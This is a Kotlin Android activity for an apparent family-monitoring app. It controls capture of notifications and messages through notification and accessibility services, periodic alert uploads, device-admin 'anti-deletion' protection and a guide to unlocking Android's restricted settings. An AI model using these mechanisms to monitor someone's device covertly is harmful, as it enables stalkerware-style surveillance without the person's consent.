package com.familia.monitor

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.google.android.material.card.MaterialCardView
import com.google.android.material.materialswitch.MaterialSwitch
import com.google.android.material.textfield.TextInputEditText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class StatusActivity : AppCompatActivity() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private val CONTACTS_PERMISSION_CODE = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_status)

        val devicePrefs = getSharedPreferences("device", MODE_PRIVATE)
        
        // 1. Interruptor Maestro de Monitoreo
        val swMonitoring = findViewById<MaterialSwitch>(R.id.sw_monitoring)
        swMonitoring.isChecked = devicePrefs.getBoolean("monitoring_enabled", true)
        
        swMonitoring.setOnCheckedChangeListener { _, isChecked ->
            devicePrefs.edit().putBoolean("monitoring_enabled", isChecked).apply()
            val msg = if (isChecked) "Monitoreo REANUDADO" else "Monitoreo PAUSADO"
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
            updateUi()
        }

        // 1.5 Modo de Supervisión Total
        val swTotalSupervision = findViewById<MaterialSwitch>(R.id.sw_total_supervision)
        swTotalSupervision.isChecked = devicePrefs.getBoolean("total_supervision", false)
        swTotalSupervision.setOnCheckedChangeListener { _, isChecked ->
            devicePrefs.edit().putBoolean("total_supervision", isChecked).apply()
            val msg = if (isChecked) "Supervisión TOTAL activada" else "Supervisión total desactivada"
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
        }

        // 2. Gestión de Token
        val etToken = findViewById<TextInputEditText>(R.id.et_token_edit)
        val btnSaveToken = findViewById<Button>(R.id.btn_save_token)
        
        etToken.setText(devicePrefs.getString("device_token", ""))
        
        btnSaveToken.setOnClickListener {
            val newToken = etToken.text.toString().trim()
            if (newToken.isNotEmpty()) {
                devicePrefs.edit().putString("device_token", newToken).apply()
                Toast.makeText(this, "Token actualizado correctamente", Toast.LENGTH_SHORT).show()
            }
        }

        // 3. Protección Anti-Borrado (Administrador)
        val btnAdmin = findViewById<Button>(R.id.btn_admin)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, AdminReceiver::class.java)

        btnAdmin.setOnClickListener {
            if (!dpm.isAdminActive(componentName)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protege la app contra desinstalación.")
                }
                startActivity(intent)
            } else {
                dpm.removeActiveAdmin(componentName)
                Toast.makeText(this, "Protección anti-borrado DESACTIVADA", Toast.LENGTH_LONG).show()
                updateUi()
            }
        }

        // 4. Botón de Prueba y Logs
        findViewById<Button>(R.id.btn_view_logs).setOnClickListener {
            startActivity(Intent(this, ChatLogActivity::class.java))
        }

        findViewById<Button>(R.id.btn_test).setOnClickListener {
            Toast.makeText(this, "Enviando señal...", Toast.LENGTH_SHORT).show()
            val battery = DeviceStateHelper.getBatteryLevel(applicationContext)
            val connection = DeviceStateHelper.getConnectionType(applicationContext)
            
            scope.launch {
                AlertUploader.sendAlert(
                    context = applicationContext,
                    sourceApp = "Sincronizador",
                    category = "prueba_manual",
                    level = "LOW",
                    fragment = "Señal de prueba enviada desde el dispositivo.",
                    timestamp = System.currentTimeMillis(),
                    battery = battery,
                    connection = connection
                )
            }
        }

        // 5. Botones de Permisos y Ayuda
        findViewById<Button>(R.id.btn_disable).setOnClickListener {
            startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }

        findViewById<Button>(R.id.btn_accessibility).setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        findViewById<Button>(R.id.btn_app_info).setOnClickListener {
            openAppInfo()
        }

        findViewById<Button>(R.id.btn_battery).setOnClickListener {
            val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            startActivity(intent)
        }

        findViewById<Button>(R.id.btn_contacts).setOnClickListener {
            checkAndRequestContactsPermission()
        }

        findViewById<Button>(R.id.btn_refresh_service).setOnClickListener {
            Toast.makeText(this, "Reiniciando lector de mensajes...", Toast.LENGTH_SHORT).show()
            NotificationCaptureService.forceRebind(this)
            updateUi()
        }

        findViewById<Button>(R.id.btn_help_permission).setOnClickListener {
            showRestrictedSettingsGuide()
        }

        // 6. Configuración por Marca (Samsung, Xiaomi, Motorola, Vivo)
        setupBrandOptimization()

        // 7. Iniciar Sincronizador Offline (WorkManager)
        setupSyncWorker()

        updateUi()
    }

    private fun setupSyncWorker() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "SyncOfflineAlerts",
            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }

    private fun setupBrandOptimization() {
        val brand = ManufacturerHelper.getDeviceBrand()
        val tvBrandTitle = findViewById<TextView>(R.id.tv_brand_title)
        val tvBrandGuide = findViewById<TextView>(R.id.tv_brand_guide)
        val btnBrandSettings = findViewById<Button>(R.id.btn_brand_settings)

        tvBrandTitle.text = "Optimización para su ${brand.name.lowercase().replaceFirstChar { it.uppercase() }}"
        tvBrandGuide.text = ManufacturerHelper.getBrandGuide(brand)
        
        btnBrandSettings.setOnClickListener {
            ManufacturerHelper.openManufacturerSettings(this, brand)
        }
    }

    private fun checkAndRequestContactsPermission() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_CONTACTS), CONTACTS_PERMISSION_CODE)
        } else {
            Toast.makeText(this, "Permiso de contactos ya concedido", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == CONTACTS_PERMISSION_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Permiso concedido correctamente", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Permiso denegado. Algunas funciones de privacidad no funcionarán.", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val pkgName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(pkgName)
    }

    private fun updateUi() {
        val devicePrefs = getSharedPreferences("device", MODE_PRIVATE)
        val isMonitoring = devicePrefs.getBoolean("monitoring_enabled", true)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val componentName = ComponentName(this, AdminReceiver::class.java)
        val isAdminActive = dpm.isAdminActive(componentName)
        val isServiceRunning = isNotificationServiceEnabled()
        val isServiceBound = NotificationCaptureService.isServiceBound
        val isAccessibilityActive = BackupCaptureService.isServiceRunning

        // Banner de advertencia si no hay permiso
        val cardWarning = findViewById<MaterialCardView>(R.id.card_permission_warning)
        cardWarning.visibility = if (isServiceRunning || isAccessibilityActive) View.GONE else View.VISIBLE

        val tvStatus = findViewById<TextView>(R.id.tv_status)
        tvStatus.text = when {
            !isServiceRunning && !isAccessibilityActive -> "❌ Ambos lectores bloqueados por Android"
            !isServiceRunning && isAccessibilityActive -> "🛡️ Lector de respaldo activo (Accesibilidad)"
            !isServiceBound -> "⚠️ Permiso OK, pero el sistema aún no activa el servicio"
            isMonitoring -> "● El sistema está capturando actividad"
            else -> "○ El sistema está en pausa"
        }

        val tvLastActivity = findViewById<TextView>(R.id.tv_last_activity)
        val lastCapture = devicePrefs.getLong("last_capture_time", 0)
        if (lastCapture > 0) {
            val date = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(lastCapture))
            tvLastActivity.text = "Última actividad detectada: $date"
        }
        
        // Color dinámico según el estado
        val statusColor = when {
            !isServiceRunning && !isAccessibilityActive -> 0xFFEF4444.toInt()
            !isServiceRunning && isAccessibilityActive -> 0xFF3B82F6.toInt()
            !isServiceBound -> 0xFFF59E0B.toInt()
            isMonitoring -> 0xFF10B981.toInt()
            else -> 0xFF6B7280.toInt()
        }
        tvStatus.setTextColor(statusColor)

        val btnAccessibility = findViewById<Button>(R.id.btn_accessibility)
        btnAccessibility.text = if (isAccessibilityActive) "LECTOR DE RESPALDO: ACTIVO" else "ACTIVAR LECTOR DE RESPALDO"
        btnAccessibility.setTextColor(if (isAccessibilityActive) 0xFF10B981.toInt() else 0xFF6B7280.toInt())

        val btnAdmin = findViewById<Button>(R.id.btn_admin)
        btnAdmin.text = if (isAdminActive) "DESACTIVAR PROTECCIÓN ANTI-BORRADO" else "ACTIVAR PROTECCIÓN ANTI-BORRADO"
        btnAdmin.setBackgroundColor(if (isAdminActive) 0xFF6B7280.toInt() else 0xFFEF4444.toInt())
    }

    private fun openAppInfo() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    private fun showRestrictedSettingsGuide() {
        AlertDialog.Builder(this)
            .setTitle("Desbloquear Ajustes (Android 13+)")
            .setMessage("Si el interruptor aparece en gris, sigue estos pasos:\n\n" +
                    "1. Presiona 'IR A INFO DE APP'.\n" +
                    "2. Toca los 3 puntos (⋮) arriba a la derecha.\n" +
                    "3. Elige 'Permitir ajustes restringidos'.\n" +
                    "4. Vuelve aquí e intenta de nuevo.")
            .setPositiveButton("IR A INFO DE APP") { _, _ -> openAppInfo() }
            .setNegativeButton("ENTENDIDO", null)
            .show()
    }

    override fun onStart() {
        super.onStart()
        if (!PinActivity.isSessionUnlocked) {
            startActivity(Intent(this, PinActivity::class.java))
            finish()
            return
        }

        // Watchdog automático al abrir la app: si el permiso está pero no está vinculado, forzar rebind
        if (isNotificationServiceEnabled() && !NotificationCaptureService.isServiceBound) {
            NotificationCaptureService.forceRebind(this)
        }
    }

    override fun onResume() {
        super.onResume()
        updateUi()
    }
}
